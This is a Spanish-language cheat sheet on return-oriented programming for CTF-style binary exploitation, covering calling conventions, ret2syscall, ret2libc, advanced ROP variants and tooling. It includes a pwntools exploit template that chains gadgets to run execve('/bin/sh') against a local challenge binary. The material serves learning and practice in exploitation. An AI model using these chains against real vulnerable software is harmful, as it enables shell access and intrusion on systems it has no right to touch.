# ROP / ret2syscall (cheat sheet)

Con NX no puedes ejecutar shellcode en la pila; encadenas "gadgets" (secuencias cortas que
acaban en `ret`) para llamar funciones o syscalls reutilizando codigo que ya existe.

## Como funciona una cadena
La pila tras el overflow es una lista de direcciones. Cada `ret` salta a la siguiente. Un
gadget `pop rdi ; ret` consume el siguiente valor de la pila hacia rdi y retorna al siguiente.
Asi cargas registros y luego llamas a una funcion/syscall.

## Convencion x86-64
- Args de funcion/syscall: rdi, rsi, rdx, r10(rcx en funcion), r8, r9.
- Syscall: numero en rax, args rdi/rsi/rdx/r10/r8/r9, instruccion `syscall`.

## execve('/bin/sh',0,0) por syscall (binarios estaticos)
Ideal cuando el binario es estatico (mucho gadget, sin libc externa). Necesitas gadgets:
`pop rdi;ret`, `pop rsi;ret`, `pop rdx;ret` (o `pop rdx;pop rbx;ret`), `pop rax;ret`, `syscall`
(o `syscall;ret`). Y la cadena "/bin/sh": si no esta en el binario, escribela en .bss con un
gadget `mov [reg], reg2` o via read/gets.
```
from pwn import *
elf = context.binary = ELF('./chall')
rop = ROP(elf)
binsh = next(elf.search(b'/bin/sh\x00')) or 0x<.bss>   # o escribir "/bin/sh" antes
rop.raw(rop.find_gadget(['pop rdi','ret'])[0]); rop.raw(binsh)
rop.raw(rop.find_gadget(['pop rsi','ret'])[0]); rop.raw(0)
rop.raw(rop.find_gadget(['pop rdx','ret'])[0]); rop.raw(0)
rop.raw(rop.find_gadget(['pop rax','ret'])[0]); rop.raw(59)   # SYS_execve
rop.raw(rop.find_gadget(['syscall'])[0])
io = process(elf.path); io.sendline(b'A'*offset + rop.chain()); io.interactive()
```
Escribir "/bin/sh" en .bss (si no existe en el binario): controla un `pop rsi; ret` + valor +
`mov qword [rsi], rax` o usa `read(0, bss, 8)` antes por ROP y envia "/bin/sh\0".

## ret2syscall en 32-bit
Numero en eax, args ebx/ecx/edx, `int 0x80`. execve=11. Gadgets `pop eax`, `pop ebx`, etc.

## ret2libc system('/bin/sh')
Para binarios dinamicos: `pop rdi; ret` + p64(binsh) + p64(ret_align) + p64(system). Necesita
la base de libc (leak). Ver [[ret2libc]] para el flujo completo con fuga.

## Sin gadgets suficientes
- ret2csu: gadgets universales de __libc_csu_init para controlar rdi/rsi/rdx ([[advanced-rop]]).
- SROP: si tienes `syscall;ret` y control de rax, monta un sigframe ([[advanced-rop]]).
- ret2dlresolve: resolver system sin leak con Partial RELRO ([[got-plt]]).
- stack pivot: si falta espacio, pivota rsp a un buffer mayor ([[advanced-rop]]).

## Alineacion (movaps)
Antes de llamar a una funcion de libc (system, printf) rsp debe estar alineado a 16. Si crashea
en un movaps, anade un gadget `ret` extra para desplazar 8 bytes.

## Encontrar el offset
`cyclic 200` -> envia -> lee el valor que sobrescribe RIP -> `cyclic_find(valor)`. No lo asumas.

## Herramientas
- ROPgadget --binary ./chall --ropchain   (genera una cadena execve automatica)
- ropper --file ./chall --search "pop rdi"
- pwntools ROP(elf): construye cadenas programaticamente y resuelve gadgets.
- one_gadget ./libc.so.6: gadget unico que da shell (con constraints de registros/stack).
